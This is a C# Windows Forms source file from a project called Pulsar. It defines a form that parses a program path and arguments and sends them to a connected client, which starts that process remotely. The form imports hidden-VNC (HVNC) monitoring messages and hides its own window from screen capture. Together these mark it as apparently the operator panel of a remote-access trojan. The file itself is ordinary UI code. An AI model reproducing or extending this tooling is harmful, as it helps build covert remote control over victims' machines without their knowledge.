using Pulsar.Common.Messages.Monitoring.HVNC;
using Pulsar.Common.Messages.Other;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Networking;
using System;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmCustomFileStarter : Form
    {
        private readonly Client _client;
        private readonly Type _messageType;
        private readonly bool _shouldParse;

        public FrmCustomFileStarter(Client c, Type messageType, bool shouldParse = true)
        {
            _client = c;
            _messageType = messageType;
            _shouldParse = shouldParse;

            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            var (program, arguments) = ParseProgramAndArguments(txtBoxPathAndArgs.Text);

            var message = Activator.CreateInstance(_messageType);
            var propPath = _messageType.GetProperty("Path");
            var propArgs = _messageType.GetProperty("Arguments");
            if (propPath != null && propPath.CanWrite)
            {
                propPath.SetValue(message, program);
            }
            if (propArgs != null && propArgs.CanWrite)
            {
                propArgs.SetValue(message, arguments);
            }
            _client.Send((IMessage)message);


            //start a new thread for the message box so it's non-blocking
            Task.Run(() =>
            {
                MessageBox.Show($"Sent message to start process:\nProgram: {program}\nArguments: {arguments}\n\nThis form is used for multiple other things so sometimes Arguments will be blank don't worry if it is", "Process Start", MessageBoxButtons.OK, MessageBoxIcon.Information);
            });
        }

        /// <summary>
        /// Parses a command line string into program and arguments, handling quotes.
        /// </summary>
        private (string program, string arguments) ParseProgramAndArguments(string input)
        {
            if (string.IsNullOrWhiteSpace(input))
                return (string.Empty, string.Empty);

            if (!_shouldParse)
                return (input.Trim(), string.Empty);

            input = input.Trim();
            if (input.StartsWith("\""))
            {
                // Match quoted program path
                var match = Regex.Match(input, "^\"([^\"]+)\"(.*)$");
                if (match.Success)
                {
                    string program = match.Groups[1].Value;
                    string arguments = match.Groups[2].Value.TrimStart();
                    return (program, arguments);
                }
            }
            // No quotes, split on first whitespace
            int firstSpace = input.IndexOf(' ');
            if (firstSpace == -1)
                return (input, string.Empty);
            string prog = input.Substring(0, firstSpace);
            string args = input.Substring(firstSpace + 1).TrimStart();
            return (prog, args);
        }
    }
}
